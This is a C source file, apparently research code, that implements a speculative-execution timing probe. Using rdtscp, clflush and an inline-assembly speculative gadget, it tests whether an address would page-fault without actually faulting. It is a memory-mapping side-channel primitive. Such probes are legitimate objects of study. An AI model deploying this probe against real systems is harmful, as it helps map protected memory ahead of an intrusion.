#define SPEC_PFAULT_C
#include "spec-pfault.h"

/////////////////////////////////////////////////

align_to(64) static blobset BLOBSET = {};
blob *TEST = &BLOBSET.test, *JUNK = &BLOBSET.junk;

uint64_t timestamp() {
	uint32_t lo, hi;
	asm volatile (
		"rdtscp;"
		"mov %%eax, %0;"
		"mov %%edx, %1;"

		: "=r"(lo), "=r"(hi)
		: : "%eax", "%ecx", "%edx");

	return (uint64_t)hi << 32 | lo; }

/* avoid my reads getting optimized out */
void mem_read(uintptr_t* mem) {
	register uintptr_t tmp;
	asm volatile (
		"mov (%1), %0; lfence;"
		: "=&r"(tmp) : "r" (mem)); }

uint64_t timed_read(uintptr_t* mem) {
	uint64_t ts0 = timestamp();
	mem_read(mem);
	return timestamp() - ts0; }

void cache_flush(void* mem) {
	asm volatile (
		"clflush (%0); mfence;"
		: : "r"(mem)); }

/////////////////////////////////////////////////

/* if `mem` is invalid, then (I suppose)
   `test` fails and `cmov*` are skipped */
void spec_test(const void* mem, uintptr_t* test) {
	register uintptr_t tmp1, tmp2;
	asm volatile (
		"prefetchnta (%2);"
		spec_call(
			"mov (%2), %1;"
			"test %1, %1;"
			"cmovz %3, %0;"
			"cmovnz %3, %0;"
			"mov (%0), %1;"
			"jmp 2f;", "%0", "%4")
		
		: "=&r"(tmp1), "=&r"(tmp2)
		: "r"(mem), "r"(test), "r"(JUNK)); }

uint64_t uint64_min(uint64_t x, uint64_t y) {
	return x < y ? x : y; }

bool spec_pfault(const void* mem) {
	uintptr_t* test = (uintptr_t*)TEST;
	uint64_t reg = 0, spec = ~0;

	cache_flush(TEST); mem_read(test);
	reg = timed_read(test);

	for (size_t j = 0; j < 8; j++) {
		cache_flush(TEST);
		for (size_t k = 0; k < 8; k++)
			spec_test(mem, test);

		spec = uint64_min(spec, timed_read(test)); }

	return spec > 2 * reg; }
